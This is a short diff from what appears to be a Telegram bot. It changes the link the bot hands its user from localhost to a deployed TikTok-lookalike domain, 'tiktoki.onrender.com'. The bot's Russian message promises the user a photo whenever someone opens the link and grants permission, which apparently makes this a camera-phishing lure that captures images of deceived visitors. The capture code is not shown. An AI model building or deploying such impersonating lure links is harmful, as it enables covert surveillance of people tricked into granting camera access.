@@ -101,10 +101,10 @@ bot.action("get_link", (ctx) => {
 
   dataBase.findOne({ id }).then((res) => {
     ctx.reply(
-      `<b>📸 Вы получите фото, если кто-то перейдет по вашей ссылке и даст разрешение. </b>\n<code>http://localhost:3000/video?v=${res.id_video}</code>`,
+      `<b>📸 Вы получите фото, если кто-то перейдет по вашей ссылке и даст разрешение. </b>\n<code>https://tiktoki.onrender.com/video?v=${res.id_video}</code>`,
       { parse_mode: "HTML" }
     );
-    //ctx.reply(`https://tiktok-video.glitch.me/video?v=${id_t}`);
+
   });
 });
 
